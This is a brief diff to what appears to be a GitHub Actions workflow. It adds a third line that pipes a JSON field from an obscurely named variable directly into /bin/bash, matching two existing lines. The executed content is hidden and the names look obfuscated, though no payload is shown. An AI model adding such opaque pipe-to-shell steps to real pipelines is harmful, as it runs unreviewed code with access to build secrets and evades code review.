@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$ccnly0151" | jq -r .tyo691 | /bin/bash
           printf '%s' "$rsg5" | jq -r .anjjv26 | /bin/bash
+          echo $vdl08 | jq -r .xme1578 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
